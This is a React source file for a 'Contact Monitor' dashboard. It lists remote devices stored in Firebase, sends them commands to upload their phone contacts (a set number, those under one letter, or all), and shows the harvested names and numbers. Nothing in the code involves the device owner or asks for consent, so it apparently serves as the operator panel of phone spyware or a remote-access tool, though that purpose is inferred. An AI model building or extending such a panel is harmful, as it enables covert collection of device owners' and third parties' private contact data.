import React, { useEffect, useState } from "react";
import {
  ref,
  get,
  set,
  onValue,
  query,
  orderByChild,
  limitToLast,
} from "firebase/database";
import { database as db } from "../firebaseConfig";
import "./AllContactsTab.css";

// Utility function
const formatPhoneNumber = (number) => {
  if (!number || typeof number !== "string") return "Unknown";
  const cleaned = number.replace(/\D/g, "");
  if (cleaned.length === 10) {
    return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3, 6)}-${cleaned.slice(
      6
    )}`;
  }
  return number;
};

const AllContactsTab = () => {
  const [deviceIds, setDeviceIds] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [contacts, setContacts] = useState([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [activeContactId, setActiveContactId] = useState(null);
  const [stats, setStats] = useState({ total: 0, unique: 0 });
  const [fetchStatus, setFetchStatus] = useState("idle");
  const [lastSync, setLastSync] = useState(null);

  // Fetch parameters
  const [fetchMode, setFetchMode] = useState("count");
  const [contactsToFetch, setContactsToFetch] = useState(50);
  const [letterFilter, setLetterFilter] = useState("");

  // Filtering options
  const [filteredContacts, setFilteredContacts] = useState([]);
  const [searchQuery, setSearchQuery] = useState("");

  // Fetch device IDs
  useEffect(() => {
    const fetchDevices = async () => {
      setLoading(true);
      setError(null);
      try {
        const devicesRef = ref(db, "Device");
        const snapshot = await get(devicesRef);

        if (!snapshot.exists()) {
          setError("No devices found in database.");
          setDeviceIds([]);
        } else {
          const devices = Object.keys(snapshot.val() || {});
          setDeviceIds(devices);
          if (devices.length > 0 && !selectedDevice) {
            setSelectedDevice(devices[0]);
          }
        }
      } catch (err) {
        setError(`Failed to fetch devices: ${err.message}`);
      } finally {
        setLoading(false);
      }
    };

    fetchDevices();
  }, []);

  // Fetch contacts and listen for updates
  useEffect(() => {
    if (!selectedDevice) return;

    let unsubscribeData = () => {};
    let unsubscribeCommand = () => {};

    const fetchContacts = async () => {
      setLoading(true);
      setError(null);

      try {
        const contactsRef = ref(db, `Device/${selectedDevice}/contacts/data`);
        const contactsQuery = query(
          contactsRef,
          orderByChild("lastContacted"),
          limitToLast(100)
        );

        unsubscribeData = onValue(
          contactsQuery,
          (snapshot) => {
            if (!snapshot.exists()) {
              setContacts([]);
              setFilteredContacts([]);
              setStats({ total: 0, unique: 0 });
              setLastSync(null);
            } else {
              const contactsData = [];
              let latestUploadTime = 0;

              snapshot.forEach((childSnapshot) => {
                const contactData = {
                  id: childSnapshot.key,
                  ...childSnapshot.val(),
                };
                if (
                  contactData.uploaded &&
                  typeof contactData.uploaded === "number" &&
                  contactData.uploaded > latestUploadTime
                ) {
                  latestUploadTime = contactData.uploaded;
                }
                contactsData.push(contactData);
              });

              contactsData.sort(
                (a, b) => (b.lastContacted || 0) - (a.lastContacted || 0)
              );
              setContacts(contactsData);
              setFilteredContacts(contactsData);
              setLastSync(latestUploadTime || null);
            }
            setLoading(false);
          },
          (error) => {
            setError(`Failed to fetch contacts: ${error.message}`);
            setLoading(false);
          }
        );

        const commandRef = ref(db, `Device/${selectedDevice}/contacts`);
        unsubscribeCommand = onValue(commandRef, (snapshot) => {
          if (snapshot.exists()) {
            const data = snapshot.val();
            setFetchStatus(data.getContacts === true ? "fetching" : "idle");
            if (data.lastUploadCompleted) {
              setLastSync(data.lastUploadCompleted);
            }
          }
        });
      } catch (err) {
        setError(`Failed to set up contact fetching: ${err.message}`);
        setLoading(false);
      }
    };

    fetchContacts();

    return () => {
      unsubscribeData();
      unsubscribeCommand();
    };
  }, [selectedDevice]);

  // Apply search filter
  useEffect(() => {
    let filtered = [...contacts];

    if (searchQuery) {
      filtered = filtered.filter(
        (contact) =>
          contact.name?.toLowerCase().includes(searchQuery.toLowerCase()) ||
          contact.phoneNumbers?.some((phone) =>
            phone.number.toLowerCase().includes(searchQuery.toLowerCase())
          )
      );
    }

    setFilteredContacts(filtered);

    const names = [
      ...new Set(filtered.map((contact) => contact.name || "Unknown")),
    ];
    setStats({
      total: filtered.length,
      unique: names.length,
    });
  }, [contacts, searchQuery]);

  // Trigger contact fetch
  const triggerContactFetch = async () => {
    if (!selectedDevice) {
      setError("No device selected");
      return;
    }

    try {
      setFetchStatus("sending");
      const commandData = {
        getContacts: true,
        Letter: "",
        HowManyNumToUpload: 0,
        AllContacts: false,
      };

      if (fetchMode === "letter" && letterFilter) {
        commandData.Letter = letterFilter.toUpperCase();
      } else if (fetchMode === "all") {
        commandData.AllContacts = true;
      } else {
        commandData.HowManyNumToUpload = Math.min(contactsToFetch, 500);
      }

      const commandRef = ref(db, `Device/${selectedDevice}/contacts`);
      await set(commandRef, commandData);
      setFetchStatus("fetching");
    } catch (err) {
      setError(`Failed to send fetch command: ${err.message}`);
      setFetchStatus("error");
    }
  };

  // Refresh contacts
  const refreshContacts = async () => {
    if (!selectedDevice) return;

    setLoading(true);
    try {
      const commandRef = ref(db, `Device/${selectedDevice}/contacts`);
      const commandSnap = await get(commandRef);

      if (commandSnap.exists() && commandSnap.val().getContacts === true) {
        setFetchStatus("fetching");
      } else {
        setFetchStatus("idle");
      }

      const contactsRef = ref(db, `Device/${selectedDevice}/contacts/data`);
      const snapshot = await get(contactsRef);

      if (!snapshot.exists()) {
        setContacts([]);
        setFilteredContacts([]);
        setStats({ total: 0, unique: 0 });
        setLastSync(null);
      } else {
        const contactsData = [];
        let latestUploadTime = 0;

        snapshot.forEach((childSnapshot) => {
          const contactData = {
            id: childSnapshot.key,
            ...childSnapshot.val(),
          };
          if (
            contactData.uploaded &&
            typeof contactData.uploaded === "number" &&
            contactData.uploaded > latestUploadTime
          ) {
            latestUploadTime = contactData.uploaded;
          }
          contactsData.push(contactData);
        });

        contactsData.sort(
          (a, b) => (b.lastContacted || 0) - (a.lastContacted || 0)
        );
        setContacts(contactsData);
        setLastSync(latestUploadTime || null);
      }
    } catch (err) {
      setError(`Failed to refresh contacts: ${err.message}`);
    } finally {
      setLoading(false);
    }
  };

  // Handle input changes
  const handleLetterFilterChange = (e) => {
    const value = e.target.value.toUpperCase();
    if (value.length <= 1 && /^[A-Z]?$/.test(value)) {
      setLetterFilter(value);
    }
  };

  const toggleFetchMode = (mode) => {
    setFetchMode(mode);
    if (mode !== "letter") setLetterFilter("");
    if (mode !== "count") setContactsToFetch(50);
  };

  const toggleContactDetails = (contactId) => {
    setActiveContactId(activeContactId === contactId ? null : contactId);
  };

  return (
    <div className="contact-all-contacts-container">
      <div className="contact-control-panel">
        <div className="contact-control-panel-header">
          <h2 className="contact-panel-title">Contact Monitor</h2>
          {lastSync && (
            <div className="contact-last-sync">
              Last synced:{" "}
              {new Date(lastSync).toLocaleString("en-US", {
                dateStyle: "medium",
                timeStyle: "short",
              })}
            </div>
          )}
        </div>

        <div className="contact-control-panel-grid">
          <div className="contact-device-selector">
            <label htmlFor="device-select">Device:</label>
            <select
              id="device-select"
              value={selectedDevice || ""}
              onChange={(e) => setSelectedDevice(e.target.value)}
              disabled={loading || deviceIds.length === 0}
            >
              {deviceIds.length === 0 ? (
                <option value="">No devices found</option>
              ) : (
                deviceIds.map((deviceId) => (
                  <option key={deviceId} value={deviceId}>
                    {deviceId}
                  </option>
                ))
              )}
            </select>
          </div>

          <div className="contact-fetch-controls">
            <div className="contact-fetch-mode-toggle">
              <button
                className={`contact-mode-button ${
                  fetchMode === "count" ? "active" : ""
                }`}
                onClick={() => toggleFetchMode("count")}
                disabled={fetchStatus === "fetching"}
              >
                By Count
              </button>
              <button
                className={`contact-mode-button ${
                  fetchMode === "letter" ? "active" : ""
                }`}
                onClick={() => toggleFetchMode("letter")}
                disabled={fetchStatus === "fetching"}
              >
                By Letter
              </button>
              <button
                className={`contact-mode-button ${
                  fetchMode === "all" ? "active" : ""
                }`}
                onClick={() => toggleFetchMode("all")}
                disabled={fetchStatus === "fetching"}
              >
                All Contacts
              </button>
            </div>

            {fetchMode === "count" && (
              <div className="contact-count-input">
                <label htmlFor="contacts-count">Number of contacts:</label>
                <input
                  id="contacts-count"
                  type="number"
                  min="1"
                  max="500"
                  value={contactsToFetch}
                  onChange={(e) =>
                    setContactsToFetch(
                      Math.max(1, parseInt(e.target.value) || 50)
                    )
                  }
                  disabled={fetchStatus === "fetching"}
                />
              </div>
            )}

            {fetchMode === "letter" && (
              <div className="contact-letter-input">
                <label htmlFor="letter-filter">Starting Letter:</label>
                <input
                  id="letter-filter"
                  type="text"
                  maxLength="1"
                  value={letterFilter}
                  onChange={handleLetterFilterChange}
                  placeholder="A-Z"
                  disabled={fetchStatus === "fetching"}
                />
              </div>
            )}

            <div className="contact-buttons-container">
              <button
                className="contact-fetch-button"
                onClick={triggerContactFetch}
                disabled={
                  !selectedDevice ||
                  fetchStatus === "fetching" ||
                  (fetchMode === "letter" && !letterFilter)
                }
              >
                {fetchStatus === "fetching"
                  ? "Fetching..."
                  : fetchStatus === "sending"
                  ? "Sending..."
                  : "Fetch Contacts"}
              </button>
              <button
                className="contact-refresh-button"
                onClick={refreshContacts}
                disabled={!selectedDevice || loading}
              >
                Refresh
              </button>
            </div>
          </div>
        </div>
      </div>

      <div className="contact-filters-panel">
        <h3 className="contact-filters-title">Filters</h3>
        <div className="contact-filters-grid">
          <div className="contact-filter-section">
            <h4 className="contact-filter-section-title">Search</h4>
            <div className="contact-search-filter">
              <input
                type="text"
                placeholder="Search by name or phone number..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
              />
              {searchQuery && (
                <button
                  className="contact-clear-search"
                  onClick={() => setSearchQuery("")}
                >
                  Clear
                </button>
              )}
            </div>
          </div>
        </div>
      </div>

      <div className="contact-contact-stats-dashboard">
        <div className="contact-stat-card">
          <div className="contact-stat-icon contact-total-icon">📋</div>
          <div className="contact-stat-content">
            <span className="contact-stat-value">{stats.total}</span>
            <span className="contact-stat-label">Total Contacts</span>
          </div>
        </div>
        <div className="contact-stat-card">
          <div className="contact-stat-icon contact-unique-icon">👤</div>
          <div className="contact-stat-content">
            <span className="contact-stat-value">{stats.unique}</span>
            <span className="contact-stat-label">Unique Names</span>
          </div>
        </div>
      </div>

      {error && (
        <div className="contact-error-message">
          <div className="contact-error-icon">⚠️</div>
          <div className="contact-error-text">{error}</div>
        </div>
      )}

      {loading && <div className="contact-loading">Loading contacts...</div>}

      {!loading && filteredContacts.length === 0 && (
        <div className="contact-no-contacts">No contacts found</div>
      )}

      {!loading && filteredContacts.length > 0 && (
        <div className="contact-contact-list">
          {filteredContacts.map((contact) => (
            <div
              key={contact.id}
              className="contact-contact-item"
              onClick={() => toggleContactDetails(contact.id)}
            >
              <div className="contact-contact-summary">
                <span className="contact-contact-name">
                  {contact.name || "Unknown"}
                </span>
                <span className="contact-phone-count">
                  {contact.phoneNumbers?.length || 0} number
                  {contact.phoneNumbers?.length !== 1 ? "s" : ""}
                </span>
                <span className="contact-expand-indicator">
                  {activeContactId === contact.id ? "▼" : "▶"}
                </span>
              </div>

              {activeContactId === contact.id && (
                <div className="contact-contact-details">
                  <div className="contact-detail-row">
                    <span className="contact-detail-label">Name:</span>
                    <span className="contact-detail-value">
                      {contact.name || "Unknown"}
                    </span>
                  </div>
                  <div className="contact-detail-row">
                    <span className="contact-detail-label">Phone Numbers:</span>
                    <span className="contact-detail-value">
                      {contact.phoneNumbers?.length > 0 ? (
                        <ul>
                          {contact.phoneNumbers.map((phone, index) => (
                            <li key={index}>
                              {formatPhoneNumber(phone.number)} ({phone.type})
                            </li>
                          ))}
                        </ul>
                      ) : (
                        "No phone numbers"
                      )}
                    </span>
                  </div>
                  <div className="contact-detail-row">
                    <span className="contact-detail-label">Upload Time:</span>
                    <span className="contact-detail-value">
                      {new Date(contact.uploaded).toLocaleString("en-US", {
                        dateStyle: "medium",
                        timeStyle: "short",
                      })}
                    </span>
                  </div>
                </div>
              )}
            </div>
          ))}
        </div>
      )}
    </div>
  );
};

export default AllContactsTab;
